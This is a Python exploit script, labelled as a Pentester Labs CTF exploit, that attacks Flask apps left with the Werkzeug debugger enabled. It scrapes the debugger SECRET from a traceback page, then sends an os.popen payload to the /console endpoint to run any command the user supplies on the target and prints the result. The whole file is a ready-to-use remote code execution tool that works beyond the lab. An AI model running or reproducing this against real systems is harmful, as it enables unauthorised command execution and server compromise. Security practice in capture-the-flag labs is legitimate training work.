#!/usr/bin/env python3
# sicario 2025 - Pentester Labs CTF exploit 
import requests
import sys
import re
import argparse
from urllib.parse import urljoin, quote
from bs4 import BeautifulSoup

# Simple color class for terminal output
class Color:
    """A simple class for adding color to terminal output."""
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_banner():
    """Prints a cool banner for the script."""
    banner = f"""
{Color.BOLD}{Color.BLUE}
                                                                    
 _ _ _         _                      ____  _____ _____ _____ _____ 
| | | |___ ___| |_ ___ ___ _ _ ___   |    \|   __| __  |  |  |   __|
| | | | -_|  _| '_|- _| -_| | | . |  |  |  |   __| __ -|  |  |  |  |
|_____|___|_| |_,_|___|___|___|_  |  |____/|_____|_____|_____|_____|
                              |___|                                 
{Color.END}
{Color.YELLOW}Werkzeug Debugger Pwner - Upgraded by Gemini{Color.END}
"""
    print(banner)

def get_secret(base_url, exploit_path):
    """
    Scrapes the Werkzeug SECRET from a traceback page.
    """
    error_url = urljoin(base_url, exploit_path)
    print(f"{Color.BLUE}[*] Attempting to fetch SECRET from: {error_url}{Color.END}")

    try:
        response = requests.get(error_url, timeout=10)
        response.raise_for_status() # Raise an exception for bad status codes
    except requests.exceptions.RequestException as e:
        print(f"{Color.RED}[-] Network Error: {e}{Color.END}")
        sys.exit(1)

    secret = re.findall(r"[0-9a-zA-Z]{20}", response.text)

    if len(secret) == 1:
        found_secret = secret[0]
        print(f"{Color.GREEN}[+] SECRET Found: {found_secret}{Color.END}")
        return found_secret
    else:
        print(f"{Color.RED}[-] Could not find the SECRET.{Color.END}")
        print(f"{Color.YELLOW}[!] Ensure the exploit URL points directly to a Werkzeug traceback page.{Color.END}")
        sys.exit(1)

def execute_command(base_url, secret, cmd):
    """
    Executes a command on the server using the Werkzeug debugger console.
    """
    print(f"{Color.BLUE}[*] Preparing to execute command...{Color.END}")
    
    # Format the command for the debugger payload
    payload = f"__import__('os').popen('{cmd}').read();"
    
    # Construct the final exploit URL
    exploit_url = urljoin(base_url, f"/console?__debugger__=yes&cmd={quote(payload)}&frm=0&s={secret}")

    print(f"{Color.YELLOW}[!] Press [Enter] to execute command on {base_url}{Color.END}")
    input()
    
    print(f"{Color.BLUE}[*] Sending payload to server...{Color.END}")
    try:
        response = requests.get(exploit_url, timeout=15)
        
        # Parse and clean the HTML response
        soup = BeautifulSoup(response.text, 'html.parser')
        output_span = soup.find('span', class_='string')
        
        if output_span:
            # Get text, strip the surrounding quotes, and strip remaining whitespace
            cleaned_output = output_span.get_text(strip=True).strip("'").strip() # <-- FINAL TWEAK
        else:
            # Fallback if the expected HTML isn't found
            cleaned_output = response.text.strip()

        print(f"\n{Color.GREEN}--- [ SERVER RESPONSE ] ---{Color.END}")
        if cleaned_output:
            print(cleaned_output)
        else:
            print(f"{Color.YELLOW}(No output returned from command){Color.END}")
        print(f"{Color.GREEN}---------------------------{Color.END}")

    except requests.exceptions.RequestException as e:
        print(f"{Color.RED}[-] Payload execution failed: {e}{Color.END}")

if __name__ == "__main__":
    print_banner()
    parser = argparse.ArgumentParser(
        description="Exploit for Werkzeug Debugger RCE. Upgraded for Python 3.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('url', help='Base URL of the target (e.g., http://ptl-ea1774a1ecbc.libcurl.me/)')
    parser.add_argument('cmd', help='The command to execute on the target machine.')
    parser.add_argument(
        '--exploit-path',
        default="/",
        help="The specific path on the server that triggers the error traceback (default: '/')"
    )
    parser.add_argument(
        '--secret',
        default=None,
        help='Provide the SECRET/PIN directly if you already have it.'
    )
    args = parser.parse_args()
    
    if not args.url.endswith('/'):
        args.url += '/'

    if args.secret:
        print(f"{Color.BLUE}[*] Using provided SECRET: {args.secret}{Color.END}")
        session_secret = args.secret
    else:
        session_secret = get_secret(args.url, args.exploit_path)
    
    execute_command(args.url, session_secret, args.cmd)
